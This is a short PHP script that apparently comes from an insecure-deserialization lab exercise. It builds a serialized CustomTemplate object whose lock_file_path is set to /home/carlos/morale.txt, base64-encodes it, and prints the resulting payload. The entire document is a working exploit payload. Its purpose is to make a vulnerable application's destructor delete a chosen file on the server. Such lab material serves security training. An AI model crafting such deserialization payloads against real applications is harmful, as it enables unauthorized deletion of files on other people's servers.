<?php
class CustomTemplate {
    private $lock_file_path = "/home/carlos/morale.txt";
}

$payload = base64_encode(serialize(new CustomTemplate()));
echo $payload;
// Output: TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MzA6IgBDdXN0b21UZW1wbGF0ZQBsb2NrX2ZpbGVfcGF0aCI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=
?>